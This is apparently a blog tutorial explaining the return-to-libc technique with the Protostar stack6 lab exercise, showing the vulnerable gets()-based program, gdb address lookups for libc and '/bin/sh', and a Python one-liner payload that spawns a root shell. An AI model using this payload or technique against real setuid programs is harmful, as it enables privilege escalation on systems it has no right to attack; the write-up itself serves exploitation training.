---
title: RET2LIBC
author: kaki-epithesi
featured-img: logo_official
categories: [Tutorial,Binary Exploitation]
tags: [ROP,ret2libc]
---


A "return-to-libc" attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call
stack is replaced by an address of a subroutine that is already present in the process’ executable memory, bypassing the no-execute bit feature
(if present) and ridding the attacker of the need to inject their own code.

[wiki](https://en.wikipedia.org/wiki/Return-to-libc_attack)

Let me explain it with protostar [stack6](https://exploit-exercises.lains.space/protostar/stack6/).

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char argv)                  
{                                                
  getpath();                                     

}                                                
```
By definition it comes with a bof attack
RET2LIBC exploit or attack is used when there are restrictions on the
return address.
```c
if((ret & 0xbf000000) == 0xbf000000) {
  printf("bzzzt (%p)\n", ret);
  _exit(1);
}
```
RET2LIBC will help us to circumvent this typ of restrictions

```bash
(gdb) info proc mappings
process 1574
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fde000 0xb7fe2000     0x4000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb)
```

coming to the definition of ret2libc
```
which a subroutine return address on a call stack is replaced by an
address of a subroutine that is already present in the process
```
A subroutine that is already present in the stack
so we are gonna serach for '/bin/sh'

```bash
(gdb) shell strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
 11f3bf /bin/sh
```
>: NOTE : 11f3bf  is  in  hex  as  "-t x"   prints  offset  in  hex.

so it is an offset 11f3bf
starting addr of libc + 0x11f3bf

```bash
(gdb) x/s 0xb7e97000 + 0x11f3bf
0xb7fb63bf:      "/bin/sh"
```

1>Now to gain root access we have to find the eip offset

2>addr of libc system

3>return address after system

4>addr of /bin/sh

```bash
user@protostar:/opt/protostar/bin$ python -c 'print"A"*80 + "\xb0\xff\xec\xb7" + "\x90"*4 + "\xbf\x63\xfb\xb7"' > /tmp/stack6f.txt
user@protostar:/opt/protostar/bin$ (cat /tmp/stack6f.txt;cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA��췐����c��
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

I just explained ret2libc

need full solution of stack6 protostar [visit](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6)
